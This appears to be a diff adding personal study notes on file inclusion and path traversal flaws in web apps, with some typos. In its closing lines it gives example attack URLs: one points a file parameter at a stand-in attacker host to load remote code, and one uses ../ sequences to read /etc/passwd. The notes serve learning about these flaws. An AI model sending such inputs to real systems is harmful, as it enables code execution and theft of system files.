@@ -1,0 +1,26 @@
+File inclusion and path traversal vulnerabilities arise when a web allows external input to change path for accessing files.
+
+To proceed, we need to know that apps have frontend that the user(client) directly interact with and the backend, which process user request sending them to the server.
+
+eg of frontend frameworks : React, Angular, Vue
+
+eg. of backend used languages and frameworks: PHP, python, Javascript, Node.js, Django, Laravel.
+
+file inclusion and path vulnerabilities arises when user inputs are not properly sanitized pr Sanitized.
+
+traversal string "../" is used to access folder one level up.
+
+Relative path refeers to using file and folder in the current directory: ./directory/fipt.sh
+
+Absolute path is mentioning the complete path of the file started to the root /
+
+Remote File Inclusion or RFI is an attacker point a parameter to a remote file that the app gets : eg. http://rfi.php?file=attacker.com/exploit.php
+
+LFI or Local File Inclusion is the attacker exploit path traversal to access file other than what thet were intented to access: http://lfi.php?file=../../../etc/passwd
+
+LFI can also lead to RCE if the attacker upload a malicious file and later include or execute it.
+
+
+
+
+
